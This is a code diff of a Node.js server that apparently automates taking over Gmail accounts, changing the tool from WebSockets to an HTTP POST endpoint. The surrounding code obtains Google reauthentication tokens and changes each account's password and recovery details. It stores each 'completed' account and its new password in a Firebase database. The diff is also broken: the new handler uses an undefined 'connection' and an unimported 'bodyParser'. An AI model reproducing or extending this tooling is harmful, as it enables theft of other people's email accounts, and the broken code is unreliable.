@@ -5,16 +5,16 @@ const express = require('express')
 const request = require('request')
 const crypto = require('crypto')
 const axios = require('axios')
-const http = require('http')
 const path = require('path')
 const fs = require('fs')
 
 
 const app = express()
 
-const server = http.createServer(app)
+app.use(express.json())
+app.use(bodyParser.urlencoded({ extended: true }))
 
-server.listen(process.env.PORT || 3000, ()=>{
+app.listen(process.env.PORT || 3000, ()=>{
     console.log("Listening on port --- "+(process.env.PORT || 3000))
 })
 
@@ -28,34 +28,30 @@ admin.initializeApp({
   
 const database = admin.database().ref('raiyan088')
 
-let wsServer = new SocketServer({httpServer:server})
-
 let mRecovery = null
 
 try {
     mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))
 } catch (e) {}
 
-
-wsServer.on('request', (req) => {
-    let connection = req.accept()
-
-    connection.on('message', (message) => {
+app.post('/', async function (req, res) {
+    if(req.body) {
         try {
-            if(message.type === 'utf8') {
-                let mData = message.utf8Data.split('★')
-                console.log('Received Data: '+mData.length)
-                if(mData.length == 8) {
-                    getRaptToken(connection, mData[6], mData)
-                }
+            let mData = req.body.data.split('★')
+            console.log('Received Data: '+mData.length)
+            if(mData.length == 8) {
+                getRaptToken(connection, mData[6], mData)
+            } else {
+                res.end('not 8')
             }
-        } catch (e) {}
-    })
-    
-    connection.on('close', function() {
-
-    })
+        } catch (e) {
+            res.end('error')
+        }
+    } else {
+        res.end('null')
+    }
 })
+
 
 function passwordMatching(connection, mData, sendCookies, again, loop, gps, password) {
 
@@ -139,7 +135,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
                                     try {
                                         if(wrong && connection != null) {
-                                            connection.send(mData[0]+' 5')
+                                            connection.end(mData[0]+' 5')
                                             let send = sendCookies
                                             if(send == null) {
                                                 send = {}
@@ -154,7 +150,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
                         try {
                             if(wrong && connection != null) {
-                                connection.send(mData[0]+' 4')
+                                connection.end(mData[0]+' 4')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
@@ -169,7 +165,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
             try {
                 if(wrong && connection != null) {
-                    connection.send(mData[0]+' 13')
+                    connection.end(mData[0]+' 13')
                     let send = sendCookies
                     if(send == null) {
                         send = {}
@@ -182,7 +178,7 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps, pass
 
         try {
             if(output == 0 && connection != null) {
-                connection.send(mData[0]+' 1')
+                connection.end(mData[0]+' 1')
                 console.log('Next')
             }
         } catch (e) {}
@@ -255,7 +251,7 @@ function getRaptToken(connection, password, mData) {
                         
                         try {
                             if(wrong && connection != null) {
-                                connection.send(mData[0]+' 2')
+                                connection.end(mData[0]+' 2')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
@@ -273,7 +269,7 @@ function getRaptToken(connection, password, mData) {
         
         try {
             if(wrong && connection != null) {
-                connection.send(mData[0]+' 3')
+                connection.end(mData[0]+' 3')
                 let send = sendCookies
                 if(send == null) {
                     send = {}
@@ -484,13 +480,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                                     let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                                     console.log(send)
                                                                                                     database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                                    connection.send(mData[0]+' 12')
+                                                                                                    connection.end(mData[0]+' 12')
                                                                                                 }
                                                                                             } catch (e) {}
                                                                                             
                                                                                             try {
                                                                                                 if(wrong && connection != null) {
-                                                                                                    connection.send(mData[0]+' 11')
+                                                                                                    connection.end(mData[0]+' 11')
                                                                                                     let send = sendCookies
                                                                                                     if(send == null) {
                                                                                                         send = {}
@@ -531,13 +527,13 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                                                 let send = { create:year, number:mData[2], password:changePass, recovery:recovery }
                                                                                 console.log(send)
                                                                                 database.child('/code/gmail/completed/'+mData[1].split('/')[0]+'/'+mGmail).update(send)
-                                                                                connection.send(mData[0]+' 12')
+                                                                                connection.end(mData[0]+' 12')
                                                                             }
                                                                         } catch (e) {}
                                                                         
                                                                         try {
                                                                             if(wrong && connection != null) {
-                                                                                connection.send(mData[0]+' 11')
+                                                                                connection.end(mData[0]+' 11')
                                                                                 let send = sendCookies
                                                                                 if(send == null) {
                                                                                     send = {}
@@ -554,7 +550,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                         console.log(body)
                                                         try {
                                                             if(wrong && connection != null) {
-                                                                connection.send(mData[0]+' 99')
+                                                                connection.end(mData[0]+' 99')
                                                                 let send = sendCookies
                                                                 if(send == null) {
                                                                     send = {}
@@ -569,7 +565,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
                                                 console.log(err)
                                                 try {
                                                     if(wrong && connection != null) {
-                                                        connection.send(mData[0]+' 9')
+                                                        connection.end(mData[0]+' 9')
                                                         let send = sendCookies
                                                         if(send == null) {
                                                             send = {}
@@ -586,7 +582,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
 
                                     try {
                                         if(wrong && connection != null) {
-                                            connection.send(mData[0]+' 8')
+                                            connection.end(mData[0]+' 8')
                                             let send = sendCookies
                                             if(send == null) {
                                                 send = {}
@@ -601,7 +597,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
 
                         try {
                             if(wrong && connection != null) {
-                                connection.send(mData[0]+' 7')
+                                connection.end(mData[0]+' 7')
                                 let send = sendCookies
                                 if(send == null) {
                                     send = {}
@@ -617,7 +613,7 @@ function Completed(connection, password, mData, sendCookies, mRAPT) {
         
         try {
             if(wrong && connection != null) {
-                connection.send(mData[0]+' 6')
+                connection.end(mData[0]+' 6')
                 let send = sendCookies
                 if(send == null) {
                     send = {}
